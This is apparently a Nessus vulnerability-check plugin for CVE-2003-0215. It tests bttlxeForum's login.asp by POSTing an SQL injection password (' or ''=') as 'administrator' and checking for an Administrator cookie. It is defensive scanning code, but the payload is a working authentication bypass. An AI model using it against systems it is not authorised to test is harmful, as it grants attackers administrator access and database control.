#
# (C) Tenable Network Security, Inc.
#

# Ref:
#  Date: Wed, 23 Apr 2003 22:05:30 -0400
#  From: SecurityTracker <help@securitytracker.com>
#  To: bugtraq@securityfocus.com
#  Subject: SQL injection in BttlxeForum

include("compat.inc");

if(description)
{
 script_id(11548);
 script_version("$Revision: 1.21 $");
 script_cve_id("CVE-2003-0215");
 script_bugtraq_id(7416);
 script_xref(name:"OSVDB", value:"8444");

 script_name(english:"bttlxeForum login.asp Multiple Field SQL Injection");
 script_summary(english:"Uses a SQL query as a password");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a SQL injection\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running bttlxeForum, a set of CGIs designed to\n",
     "run a forum-based web server on Windows.\n\n",
     "There is a SQL injection bug in the remote server which allowed\n",
     "Nessus to log in as 'administrator' by supplying the password 'or id='\n",
     "in a POST request.\n\n",
     "A remote attacker may use this flaw to view and change sensitive\n",
     "information in the database."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?6c26f56c"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Apply the patch referenced in the vendor's advisory."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);

enable_cookiejar();

foreach d (cgi_dirs())
{
 if (is_cgi_installed3(item:d + "/myaccount/login.asp", port:port))
 {
  h = make_array( "Content-Type", "application/x-www-form-urlencoded",
       		    "Accept", "*/*",
		    "Referer", strcat("http://", get_host_name(), d, "/myaccount/login.asp") );
  r = http_send_recv3(port: port, method: 'POST', item: d + "/myaccount/login.asp",
       data: "userid=administrator&password=+%27or%27%27%3D%27+&cookielogin=cookielogin&Submit=Log+In", 
       add_headers: h );

  if (isnull(r)) exit(0);
  if (get_http_cookie(name: "ForumMemberLevel", path: "/") == "Administrator")
  {
   security_hole(port);
   set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
   exit(0);
  }
 }
}
